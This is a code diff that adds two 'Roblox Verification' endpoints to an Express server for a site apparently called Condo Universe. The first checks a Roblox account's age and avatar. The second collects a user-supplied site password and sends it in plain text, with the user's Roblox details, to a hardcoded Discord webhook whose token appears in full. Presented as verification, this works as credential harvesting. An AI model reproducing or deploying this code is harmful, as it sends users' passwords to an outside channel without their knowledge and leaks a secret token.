@@ -146,4 +146,77 @@ app.patch("/api/settings", requireAdmin, async (req, res) => {
   res.json(result.data);
 });
 
+
+
+  // --- Roblox Verification ---
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1518840117014433842/Zyu-HdmwIcZRz8FVnunHNnjgbmqJze64b4wER881Ow4Kta_Xyr6HjZPb7xeh6krxM0vT";
+  const ROBLOX_MIN_DAYS = 70;
+
+  app.post("/api/verify/check", async (req: express.Request, res: express.Response): Promise<void> => {
+    const { username } = (req.body as { username?: string }) ?? {};
+    if (!username || typeof username !== "string") {
+      res.status(400).json({ error: "Username is required" });
+      return;
+    }
+    try {
+      const searchRes = await fetch("https://users.roblox.com/v1/usernames/users", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ usernames: [username.trim()], excludeBannedUsers: false }),
+      });
+      const searchData = await searchRes.json() as { data: { id: number; name: string; displayName: string }[] };
+      if (!searchData.data || searchData.data.length === 0) {
+        res.status(404).json({ error: "Conta nao encontrada. Verifique o nome de usuario." });
+        return;
+      }
+      const foundUser = searchData.data[0];
+      const foundUserId = foundUser.id;
+      const userRes = await fetch("https://users.roblox.com/v1/users/" + foundUserId);
+      const userData = await userRes.json() as { id: number; name: string; displayName: string; created: string; description: string; isBanned: boolean };
+      const ageDays = Math.floor((Date.now() - new Date(userData.created).getTime()) / 86400000);
+      if (ageDays < ROBLOX_MIN_DAYS) {
+        res.status(403).json({ error: "Conta muito nova. Sua conta tem " + ageDays + " dias. O minimo exigido e " + ROBLOX_MIN_DAYS + " dias.", ageDays, required: ROBLOX_MIN_DAYS });
+        return;
+      }
+      const avatarRes = await fetch("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" + foundUserId + "&size=150x150&format=Png&isCircular=true");
+      const avatarData = await avatarRes.json() as { data: { imageUrl: string }[] };
+      const avatarUrl = avatarData.data?.[0]?.imageUrl ?? null;
+      res.json({ id: foundUserId, username: userData.name, displayName: userData.displayName, created: userData.created, ageDays, avatarUrl, description: userData.description });
+    } catch {
+      res.status(500).json({ error: "Erro ao verificar conta. Tente novamente." });
+    }
+  });
+
+  app.post("/api/verify/register", async (req: express.Request, res: express.Response): Promise<void> => {
+    const { robloxId, robloxUsername, displayName, avatarUrl, ageDays, created, sitePassword } = (req.body as Record<string, string>) ?? {};
+    if (!robloxUsername || !sitePassword) { res.status(400).json({ error: "Dados incompletos" }); return; }
+    try {
+      const createdDate = new Date(created).toLocaleDateString("pt-BR");
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          embeds: [{
+            title: "Novo Membro Verificado - Condo Universe",
+            color: 0xe31221,
+            thumbnail: { url: avatarUrl ?? "" },
+            fields: [
+              { name: "Usuario Roblox", value: "**" + robloxUsername + "**", inline: true },
+              { name: "Nome de exibicao", value: displayName || robloxUsername, inline: true },
+              { name: "ID Roblox", value: String(robloxId), inline: true },
+              { name: "Conta criada em", value: createdDate, inline: true },
+              { name: "Idade da conta", value: ageDays + " dias", inline: true },
+              { name: "Senha do site", value: sitePassword, inline: false },
+            ],
+            footer: { text: "Condo Universe - Verificacao automatica" },
+            timestamp: new Date().toISOString(),
+          }],
+        }),
+      });
+      res.json({ success: true });
+    } catch {
+      res.status(500).json({ error: "Erro ao enviar dados." });
+    }
+  });
+  
 export default app;
